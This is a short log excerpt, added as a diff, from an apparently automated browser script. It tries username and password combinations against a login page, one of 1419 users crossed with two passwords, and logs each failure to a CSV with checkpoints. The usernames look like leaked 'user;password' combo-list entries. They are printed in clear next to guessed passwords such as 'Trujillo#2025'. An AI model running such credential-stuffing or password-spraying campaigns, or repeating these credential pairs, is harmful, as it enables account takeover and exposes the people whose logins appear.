+2025-10-04 10:39:20,288 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":true} | headers=HTTPHeaderDict({'Content-Length': '14', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:20,289 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:20,290 - [ThreadPoolExecutor-0_0] - DEBUG - GET http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.34/text {}
+2025-10-04 10:39:20,307 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "GET /session/43d29662828e07ec17e4409986fb77c5/element/f.55031777608A59E9C7B9E99BFB2D8B34.d.68397F8F7B9E9CA5FF726834D06F8D5B.e.34/text HTTP/1.1" 200 0
+2025-10-04 10:39:20,308 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":"Usuario no encontrado."} | headers=HTTPHeaderDict({'Content-Length': '34', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:20,309 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:20,311 - [ThreadPoolExecutor-0_0] - ERROR - ❌ Error genérico detectado: 'Usuario no encontrado.'
+2025-10-04 10:39:20,312 - [ThreadPoolExecutor-0_0] - ERROR - ❌ LOGIN INCORRECTO: Usuario='melaureanoram;Telefonica#2025' | Password='Trujillo#2025'
+2025-10-04 10:39:20,325 - [ThreadPoolExecutor-0_0] - INFO - 💾 Resultado guardado en 'loginIncorrecto.csv': melaureanoram;Telefonica#2025
+2025-10-04 10:39:20,331 - [ThreadPoolExecutor-0_0] - INFO - 💾 Checkpoint guardado: Usuario #0, Password #0
+2025-10-04 10:39:20,333 - [ThreadPoolExecutor-0_0] - DEBUG - DELETE http://localhost:53790/session/43d29662828e07ec17e4409986fb77c5 {}
+2025-10-04 10:39:20,565 - [ThreadPoolExecutor-0_0] - DEBUG - http://localhost:53790 "DELETE /session/43d29662828e07ec17e4409986fb77c5 HTTP/1.1" 200 0
+2025-10-04 10:39:20,566 - [ThreadPoolExecutor-0_0] - DEBUG - Remote response: status=200 | data={"value":null} | headers=HTTPHeaderDict({'Content-Length': '14', 'Content-Type': 'application/json; charset=utf-8', 'cache-control': 'no-cache'})
+2025-10-04 10:39:20,567 - [ThreadPoolExecutor-0_0] - DEBUG - Finished Request
+2025-10-04 10:39:23,773 - [ThreadPoolExecutor-0_0] - INFO - 🔒 Navegador cerrado
+2025-10-04 10:39:23,777 - [ThreadPoolExecutor-0_0] - INFO - 
+======================================================================
+2025-10-04 10:39:23,785 - [ThreadPoolExecutor-0_0] - INFO - 🔄 PROCESANDO COMBINACIÓN #3
+2025-10-04 10:39:23,797 - [ThreadPoolExecutor-0_0] - INFO -    Usuario: ctatajeclot;Telefonica#2026 (#2/1419)
+2025-10-04 10:39:23,798 - [ThreadPoolExecutor-0_0] - INFO -    Password: Trujillo#2025 (#1/2)
+2025-10-04 10:39:23,799 - [ThreadPoolExecutor-0_0] - INFO - ======================================================================
